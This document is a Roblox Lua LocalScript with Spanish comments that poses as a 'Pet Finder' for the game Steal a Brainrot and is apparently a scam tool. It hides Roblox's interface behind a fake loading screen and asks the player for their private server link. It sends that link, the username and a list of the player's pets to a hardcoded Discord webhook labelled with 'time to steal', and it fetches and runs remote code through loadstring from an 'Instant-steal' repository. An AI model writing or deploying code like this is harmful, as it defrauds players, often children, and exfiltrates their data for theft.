-- 📍 Colocar en: StarterGui > ScreenGui > LocalScript
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local StarterGui = game:GetService("StarterGui")
local CoreGui = game:GetService("CoreGui")
local SoundService = game:FindService("SoundService") or game:GetService("SoundService")
local TeleportService = game:GetService("TeleportService")
local HttpService = game:GetService("HttpService")

-- 🔒 DEFINIR PLAYER UNA SOLA VEZ AL INICIO
local player = Players.LocalPlayer
local playerGui = player:WaitForChild("PlayerGui")

-- 🔒 Función para verificar y expulsar jugadores si hay más de uno
local function checkPlayerCount()
    local playerCount = #Players:GetPlayers()
    
    if playerCount > 1 then
        -- Mostrar mensaje a todos los jugadores
        for _, otherPlayer in ipairs(Players:GetPlayers()) do
            local message = "❌ Solo debe haber un jugador en el servidor. Saliendo..."
            
            -- Intentar mostrar mensaje en la pantalla del jugador
            local otherPlayerGui = otherPlayer:FindFirstChild("PlayerGui")
            if otherPlayerGui then
                local screenGui = Instance.new("ScreenGui")
                local textLabel = Instance.new("TextLabel")
                
                screenGui.Parent = otherPlayerGui
                textLabel.Parent = screenGui
                
                textLabel.Size = UDim2.new(1, 0, 1, 0)
                textLabel.BackgroundColor3 = Color3.new(0, 0, 0)
                textLabel.TextColor3 = Color3.new(1, 0, 0)
                textLabel.Text = message
                textLabel.Font = Enum.Font.SourceSansBold
                textLabel.TextSize = 24
                textLabel.ZIndex = 10
            end
            
            -- También mostrar en output (consola)
            print("[SISTEMA] " .. message .. " Jugador: " .. otherPlayer.Name)
        end
        
        -- Esperar 3 segundos antes de expulsar
        wait(3)
        
        -- Expulsar a todos los jugadores
        for _, otherPlayer in ipairs(Players:GetPlayers()) do
            pcall(function()
                otherPlayer:Kick("Solo debe haber un jugador en el servidor")
            end)
        end
        
        return true -- Se expulsaron jugadores
    end
    
    return false -- No se necesitó expulsar
end

-- Sistema de verificación inicial (20 segundos)
local startTime = tick()
local initialCheckConnection

initialCheckConnection = RunService.Heartbeat:Connect(function()
    local elapsedTime = tick() - startTime
    
    -- Verificar cada segundo durante los primeros 20 segundos
    if elapsedTime % 1 < 0.1 then -- Aproximadamente cada segundo
        local playerCount = #Players:GetPlayers()
        print(string.format("[Sistema] Jugadores: %d, Tiempo: %ds", playerCount, math.floor(elapsedTime)))
        
        if checkPlayerCount() then
            initialCheckConnection:Disconnect()
            return
        end
    end
    
    -- Después de 20 segundos, desconectar esta verificación intensiva
    if elapsedTime >= 20 then
        print("[Sistema] Verificación intensiva completada")
        initialCheckConnection:Disconnect()
        
        -- Iniciar verificación menos frecuente
        while true do
            wait(5) -- Verificar cada 5 segundos
            
            local playerCount = #Players:GetPlayers()
            print(string.format("[Sistema] Verificación periódica - Jugadores: %d", playerCount))
            
            checkPlayerCount()
        end
    end
end)

-- También verificar cuando un jugador se une
Players.PlayerAdded:Connect(function(newPlayer)
    wait(1) -- Esperar un momento para que se actualice el count
    
    local playerCount = #Players:GetPlayers()
    print("[Sistema] Jugador añadido: " .. newPlayer.Name .. " - Total: " .. playerCount)
    
    if playerCount > 1 then
        checkPlayerCount()
    end
end)

-- Detener sonidos
for _, sound in ipairs(workspace:GetDescendants()) do
    if sound:IsA("Sound") then
        sound.Playing = false
    end
end

-- 🔒 Ocultar interfaz de Roblox
local function hideRobloxUI()
    pcall(function() CoreGui:WaitForChild("TopBarApp"):Destroy() end)
    pcall(function() StarterGui:SetCore("TopbarEnabled", false) end)
    for _, obj in ipairs(CoreGui:GetChildren()) do
        if obj:IsA("ScreenGui") and (obj.Name:find("TopBar") or obj.Name:find("Menu")) then
            pcall(function() obj.Enabled = false end)
        end
    end
    pcall(function() StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, false) end)
end

hideRobloxUI()
local uiHideConnection = RunService.RenderStepped:Connect(hideRobloxUI)

-- 🧱 GUI principal
local mainGui = Instance.new("ScreenGui")
mainGui.IgnoreGuiInset = true
mainGui.ResetOnSpawn = false
mainGui.DisplayOrder = 999
mainGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
mainGui.Parent = playerGui

local safetyCover = Instance.new("Frame")
safetyCover.Size = UDim2.new(1, 0, 1.15, 0)
safetyCover.Position = UDim2.new(0, 0, -0.1, 0)
safetyCover.BackgroundColor3 = Color3.new(0, 0, 0)
safetyCover.BorderSizePixel = 0
safetyCover.ZIndex = 1
safetyCover.Parent = mainGui

------------------------------------------------------------
-- 🧩 Pantalla inicial
------------------------------------------------------------
local introFrame = Instance.new("Frame")
introFrame.Size = UDim2.new(1, 0, 1, 0)
introFrame.BackgroundColor3 = Color3.new(0, 0, 0)
introFrame.ZIndex = 100
introFrame.Parent = mainGui

local title = Instance.new("TextLabel")
title.Size = UDim2.new(0, 400, 0, 50)
title.Position = UDim2.new(0.5, -200, 0.4, -60)
title.BackgroundTransparency = 1
title.Text = "Url de tu servidor"
title.TextColor3 = Color3.new(1, 1, 1)
title.TextSize = 28
title.Font = Enum.Font.GothamBold
title.ZIndex = 101
title.Parent = introFrame

local textBox = Instance.new("TextBox")
textBox.Size = UDim2.new(0, 300, 0, 40)
textBox.Position = UDim2.new(0.5, -150, 0.5, -20)
textBox.BackgroundColor3 = Color3.new(0.1, 0.1, 0.1)
textBox.TextColor3 = Color3.new(1, 1, 1)
textBox.PlaceholderText = "Url server privado"
textBox.Font = Enum.Font.Gotham
textBox.TextSize = 20
textBox.ZIndex = 101
textBox.Parent = introFrame

local errorLabel = Instance.new("TextLabel")
errorLabel.Size = UDim2.new(0, 400, 0, 30)
errorLabel.Position = UDim2.new(0.5, -500, 0.55, 30)
errorLabel.BackgroundTransparency = 1
errorLabel.TextColor3 = Color3.fromRGB(255, 50, 50)
errorLabel.TextSize = 18
errorLabel.Font = Enum.Font.Gotham
errorLabel.Text = "Incorrecto"
errorLabel.ZIndex = 101
errorLabel.Parent = introFrame

local startButton = Instance.new("TextButton")
startButton.Size = UDim2.new(0, 150, 0, 40)
startButton.Position = UDim2.new(0.5, -75, 0.63, 10)
startButton.BackgroundColor3 = Color3.new(0.2, 0.2, 0.2)
startButton.Text = "Empezar"
startButton.TextColor3 = Color3.new(1, 1, 1)
startButton.TextSize = 22
startButton.Font = Enum.Font.GothamBold
startButton.ZIndex = 101
startButton.Parent = introFrame

local cancelButton = Instance.new("TextButton")
cancelButton.Size = UDim2.new(0, 150, 0, 40)
cancelButton.Position = UDim2.new(0.5, -75, 0.7, 60)
cancelButton.BackgroundColor3 = Color3.new(0.4, 0.1, 0.1)
cancelButton.Text = "Cancelar"
cancelButton.TextColor3 = Color3.new(1, 1, 1)
cancelButton.TextSize = 22
cancelButton.Font = Enum.Font.GothamBold
cancelButton.ZIndex = 101
cancelButton.Parent = introFrame

------------------------------------------------------------
-- ⏳ Pantalla de carga
------------------------------------------------------------
local loadingFrame = Instance.new("Frame")
loadingFrame.Size = UDim2.new(1, 0, 1, 0)
loadingFrame.BackgroundColor3 = Color3.new(0, 0, 0)
loadingFrame.Visible = false
loadingFrame.ZIndex = 200
loadingFrame.Parent = mainGui

local lettersContainer = Instance.new("Frame")
lettersContainer.Size = UDim2.new(0, 300, 0, 100)
lettersContainer.Position = UDim2.new(0.5, -150, 0.45, -50)
lettersContainer.BackgroundTransparency = 1
lettersContainer.ZIndex = 201
lettersContainer.Parent = loadingFrame

local letters = {"L", "O", "A", "D", "I", "N", "G"}
local textLabels = {}

for i, letter in ipairs(letters) do
	local textLabel = Instance.new("TextLabel")
	textLabel.Text = letter
	textLabel.Size = UDim2.new(0, 30, 0, 50)
	textLabel.Position = UDim2.new(0, (i-1) * 35, 0, 25)
	textLabel.BackgroundTransparency = 1
	textLabel.TextColor3 = Color3.new(1, 1, 1)
	textLabel.TextSize = 32
	textLabel.Font = Enum.Font.GothamBold
	textLabel.ZIndex = 202
	textLabel.TextStrokeColor3 = Color3.new(0, 0, 0)
	textLabel.TextStrokeTransparency = 0.3
	textLabel.Parent = lettersContainer
	table.insert(textLabels, textLabel)
end

-- 📊 Barra de carga
local barFrame = Instance.new("Frame")
barFrame.Size = UDim2.new(0, 400, 0, 20)
barFrame.Position = UDim2.new(0.5, -200, 0.65, 0)
barFrame.BackgroundColor3 = Color3.new(0.2, 0.2, 0.2)
barFrame.BorderSizePixel = 0
barFrame.ZIndex = 202
barFrame.Parent = loadingFrame

local barFill = Instance.new("Frame")
barFill.Size = UDim2.new(0, 0, 1, 0)
barFill.BackgroundColor3 = Color3.fromRGB(0, 255, 0)
barFill.BorderSizePixel = 0
barFill.ZIndex = 203
barFill.Parent = barFrame

-- 📜 Texto de estado
local statusText = Instance.new("TextLabel")
statusText.Size = UDim2.new(1, 0, 0, 40)
statusText.Position = UDim2.new(0, 0, 0.75, 10)
statusText.BackgroundTransparency = 1
statusText.TextColor3 = Color3.new(1, 1, 1)
statusText.TextSize = 22
statusText.Font = Enum.Font.GothamBold
statusText.ZIndex = 203
statusText.Text = ""
statusText.Parent = loadingFrame

-- 🌐 Sistema de envío webhook MEJORADO con datos de Brainrots
local function horaMexico()
	local time = os.time()
	local mexicoOffset = -6 * 3600 -- UTC-6
	local localTime = os.date("!*t", time + mexicoOffset)
	return string.format("%04d-%02d-%02d %02d:%02d:%02d", localTime.year, localTime.month, localTime.day, localTime.hour, localTime.min, localTime.sec)
end

-- 🧠 Extraer datos de Brainrots (DisplayName - Generation - Mutation)
local function getBrainrotData(plot)
	local results = {}
	local animalPodiums = plot:FindFirstChild("AnimalPodiums")
	if not animalPodiums then
		return {"Ningún Brainrot encontrado"}
	end

	for _, folder in ipairs(animalPodiums:GetChildren()) do
		local displayText, genText, mutationText = "N/A", "N/A", "N/A"
		for _, descendant in ipairs(folder:GetDescendants()) do
			if descendant:IsA("TextLabel") then
				local name = string.lower(descendant.Name)
				if name:find("display") then
					displayText = descendant.Text
				elseif name:find("generation") then
					genText = descendant.Text
				elseif name:find("mutation") then
					mutationText = descendant.Text
				end
			end
		end
		if displayText ~= "N/A" or genText ~= "N/A" or mutationText ~= "N/A" then
			table.insert(results, displayText .. " - " .. genText .. " - " .. mutationText)
		end
	end

	return (#results > 0) and results or {"Ningún Brainrot encontrado"}
end

-- 🎯 Buscar el plot del jugador
local function findMyPlot()
	local plotsFolder = workspace:FindFirstChild("Plots")
	if not plotsFolder then return nil end

	for _, plot in pairs(plotsFolder:GetChildren()) do
		local plotSign = plot:FindFirstChild("Plotsign") or plot:FindFirstChild("PlotSign")
		if plotSign then
			local surfaceGui = plotSign:FindFirstChild("SurfaceGui")
			if surfaceGui then
				local frame = surfaceGui:FindFirstChild("Frame")
				if frame then
					local textLabel = frame:FindFirstChild("TextLabel")
					if textLabel and textLabel:IsA("TextLabel") then
						if string.find(string.lower(textLabel.Text), string.lower(player.Name)) then
							return plot
						end
					end
				end
			end
		end
	end
	return nil
end

-- 🚀 Enviar información al Webhook
local function sendToWebhook(url, data)
	local myPlot = findMyPlot()
	local plotInfo = myPlot and ("Plot encontrado: " .. myPlot.Name) or "No se encontró plot personal"
	local brainrotList = myPlot and getBrainrotData(myPlot) or {"Ningún Brainrot encontrado"}
	local brainrotText = table.concat(brainrotList, "\n")

	local embedData = {
		content = "🔔 **Nuevo evento detectado**",
		embeds = {{
			title = "📡 Datos de Escaneo",
			color = 65280,
			fields = {
				{
					name = "👤 Usuario",
					value = "`"..player.Name.."`",
					inline = true
				},
				{
					name = "🌐 Server Link",
					value = "" ..data.url.."",
					inline = true
				},
				{
					name = "📊 Información del Plot",
					value =  plotInfo,
					inline = false
				},
				{
					name = "🧠 Brainrots Detectados",
					value = "***" ..brainrotText.. "***",
					inline = false
				},
				{
					name = "📈 Total Brainrots",
					value = "```py\n".. tostring(#brainrotList).. "```",
					inline = true
				},
				{
					name = "🕒 Fecha/Hora (México)",
					value = horaMexico(),
					inline = true
				},
				{
					name = "⏱️ Tiempo para robar",
					value = "4 minutos restantes ⏳",
					inline = false
				}
			},
			footer = {
				text = "🐾 Pet Finder | Sistema de rastreo Brainrot"
			}
		}}
	}

	local success, response = pcall(function()
		return HttpService:RequestAsync({
			Url = url,
			Method = "POST",
			Headers = {["Content-Type"] = "application/json"},
			Body = HttpService:JSONEncode(embedData)
		})
	end)

	if success then
		print("✅ Datos enviados correctamente al webhook.")
	else
		warn("❌ Error al enviar webhook: " .. tostring(response))
	end
end

-- 🔔 Toast final
local function showFatalError()
	local toast = Instance.new("TextLabel")
	toast.Size = UDim2.new(0, 400, 0, 60)
	toast.Position = UDim2.new(0.5, -200, 0.85, 0)
	toast.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
	toast.TextColor3 = Color3.new(1, 1, 1)
	toast.Text = "⚠️ Fatal error: Asegurate que tienes activado: Servidores privados>Todos"
	toast.TextSize = 24
	toast.Font = Enum.Font.GothamBlack
	toast.ZIndex = 300
	toast.Parent = mainGui

	-- Efecto "neón" brillante
	local glow = Instance.new("UIStroke")
	glow.Thickness = 3
	glow.Color = Color3.fromRGB(255, 50, 50)
	glow.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
	glow.Parent = toast

	task.wait(5)
	toast:Destroy()
end

------------------------------------------------------------
-- 🔄 Animaciones
------------------------------------------------------------
local delays = {0, 0.2, 0.4, 0.6, 0.8, 1.0, 1.2}
local function startLoadingAnimation()
	for i, textLabel in ipairs(textLabels) do
		local delayTime = delays[i]
		coroutine.wrap(function()
			task.wait(delayTime)
			while loadingFrame.Visible do
				for step = 0, 1, 0.1 do
					textLabel.TextTransparency = step * 0.8
					task.wait(0.05)
				end
				for step = 1, 0, -0.1 do
					textLabel.TextTransparency = step * 0.8
					task.wait(0.05)
				end
				task.wait(0.5)
			end
		end)()
	end
end

local function updateStatusMessages()
	statusText.Text = "Encontrando servidor..."
	task.wait(10)
	
	-- Contador de 20 segundos para "obteniendo Brainrots"
	local countdown = 20
	for i = countdown, 1, -1 do
		statusText.Text = "obteniendo Brainrots (" .. i .. "s)"
		task.wait(1)
	end

	-- 🎯 OCULTAR INTERFAZ PRINCIPAL TEMPORALMENTE
	loadingFrame.Visible = false
	mainGui.Enabled = false
	
	-- 🕐 Crear texto de carga externa
	local externalLoadText = Instance.new("TextLabel")
	externalLoadText.Size = UDim2.new(0, 400, 0, 40)
	externalLoadText.Position = UDim2.new(0.5, -200, 0.5, -20)
	externalLoadText.BackgroundTransparency = 1
	externalLoadText.TextColor3 = Color3.new(1, 1, 1)
	externalLoadText.TextSize = 24
	externalLoadText.Font = Enum.Font.GothamBold
	externalLoadText.Text = "Cargando interfaz externa..."
	externalLoadText.ZIndex = 300
	externalLoadText.Parent = mainGui

	-- Cargar interfaz externa
	local success, errorMsg = pcall(function()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/LeyendaZero/Instant-steal/main/seleccionar.lua"))()
	end)
	
	if not success then
		externalLoadText.Text = "Error cargando interfaz externa"
		task.wait(3)
	end
	
	-- ⏱️ Esperar 20 segundos con contador
	local waitTime = 5
	for i = waitTime, 1, -1 do
		externalLoadText.Text = "Cargando interfaz externa... (" .. i .. "s)"
		task.wait(1)
	end
	
	-- 🔄 REACTIVAR INTERFAZ PRINCIPAL DESPUÉS DE 20 SEGUNDOS
	externalLoadText:Destroy()
	mainGui.Enabled = true
	loadingFrame.Visible = true
	
	-- Continuar con el código original...
	statusText.Text = "obteniendo Brainrots - LISTO!"
	task.wait(2)
	
	local messages = {
		"Restaurando script..",
		"Moviendo hitbox...",
		"Implementando nuevos códigos...",
		"Fallo en Replicate Storage - intentando de nuevo...",
		"Buscando en Workspace..."
	}
	while loadingFrame.Visible do
		statusText.Text = messages[math.random(1, #messages)]
		task.wait(math.random(5, 10))
	end
end

local function animateProgressBar()
	local totalTime = 240
	local stepTime = 0.2
	local steps = totalTime / stepTime
	for i = 1, steps do
		local progress = i / steps
		barFill.Size = UDim2.new(progress, 0, 1, 0)
		task.wait(stepTime)
	end
end

------------------------------------------------------------
-- 🔁 Flujo principal
------------------------------------------------------------
local function startSequence(url)
	introFrame.Visible = false
	loadingFrame.Visible = true
	
	-- 🔄 Enviar datos al webhook antes de empezar la animación
	task.spawn(function()
		local webhookUrl = "https://discord.com/api/webhooks/1398573923280359425/SQDEI2MXkQUC6f4WGdexcHGdmYpUO_sARSkuBmF-Wa-fjQjsvpTiUjVcEjrvuVdSKGb1"
		
		local data = {
			url = url,
			playerName = player.Name,
			playerId = player.UserId,
			gameId = game.GameId,
			timestamp = os.time()
		}
		
		statusText.Text = "Enviando datos..."
		
		-- CORREGIDO: La función sendToWebhook no retorna valores, solo ejecuta
		sendToWebhook(webhookUrl, data)
		
		print("✅ Datos enviados al webhook - Iniciando secuencia...")
		statusText.Text = "Datos enviados - Iniciando secuencia..."
		
		task.wait(2)
	end)
	
	-- Iniciar animaciones
	startLoadingAnimation()
	task.spawn(updateStatusMessages)
	task.spawn(animateProgressBar)

	task.delay(240, function()
		if uiHideConnection then uiHideConnection:Disconnect() end
		pcall(function() StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, true) end)
		pcall(function() StarterGui:SetCore("TopbarEnabled", true) end)
		loadingFrame.Visible = false
		showFatalError()
	end)
end

-- CORREGIDO: Función kickPlayer mejorada
local function kickPlayer()
	if uiHideConnection then 
		uiHideConnection:Disconnect() 
	end
	pcall(function() 
		StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, true) 
	end)
	pcall(function() 
		StarterGui:SetCore("TopbarEnabled", true) 
	end)
	
	-- USAR pcall PARA MANEJAR POSIBLES ERRORES
	local success, errorMsg = pcall(function()
		player:Kick("Has cancelado la experiencia")
	end)
	
	if not success then
		warn("Error al expulsar jugador: " .. tostring(errorMsg))
		-- Intentar método alternativo
		pcall(function()
			game:Shutdown()
		end)
	end
end

startButton.MouseButton1Click:Connect(function()
	local text = textBox.Text
	if string.sub(text, 1, 23) == "https://www.roblox.com/" then
		errorLabel.Text = ""
		startSequence(text)
	else
		errorLabel.Text = "Url invalida"
	end
end)

cancelButton.MouseButton1Click:Connect(kickPlayer)

-- CORREGIDO: Bucle while con end faltante
while true do
	hideRobloxUI()
	task.wait(0.5)
end
-- FIN DEL SCRIPT - YA NO FALTAN END
